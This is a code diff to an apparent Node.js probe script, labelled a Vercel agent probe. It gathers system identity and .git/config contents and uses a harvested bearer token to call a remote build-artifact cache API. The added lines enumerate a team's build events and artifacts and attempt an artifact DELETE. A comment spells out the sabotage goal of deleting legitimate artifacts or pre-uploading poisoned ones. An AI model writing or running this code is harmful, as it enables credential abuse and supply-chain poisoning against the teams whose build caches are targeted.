@@ -126,7 +126,7 @@ function tryDecrypt(keyStr, contentStr) {
 }
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v14",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v15",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -283,6 +283,25 @@ const report = {
     ).toString().trim());
     const eventsBody = safe(() => readFileSync('/tmp/art_events', 'utf8').slice(0, 200));
 
+    // GET events (enumerate team's build hashes) — not in Turborepo public API but worth checking
+    const getEventsStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_getev -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const getEventsBody = safe(() => readFileSync('/tmp/art_getev', 'utf8').slice(0, 200));
+
+    // DELETE artifact — does the token have delete capability?
+    // (Sabotage: delete legitimate artifact → force team to rebuild → or pre-upload poisoned version)
+    const deleteStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_del -w '%{http_code}' -X DELETE -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/beefdeadbeefdeadbeefdeadbeefdeadbeef1337?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const deleteBody = safe(() => readFileSync('/tmp/art_del', 'utf8').slice(0, 200));
+
+    // GET artifacts list — enumerate all team artifacts
+    const listStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_list -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const listBody = safe(() => readFileSync('/tmp/art_list', 'utf8').slice(0, 200));
+
     return {
       type: claims ? 'jwt' : 'opaque',
       claims,
@@ -292,6 +311,9 @@ const report = {
       getStatus, getBody,
       putStatus, putBody,
       eventsStatus, eventsBody,
+      getEventsStatus, getEventsBody,
+      deleteStatus, deleteBody,
+      listStatus, listBody,
     };
   }),
   // VERCEL_DEPLOYMENT_KEY — unknown 44-char key; probe against Vercel API as Bearer token
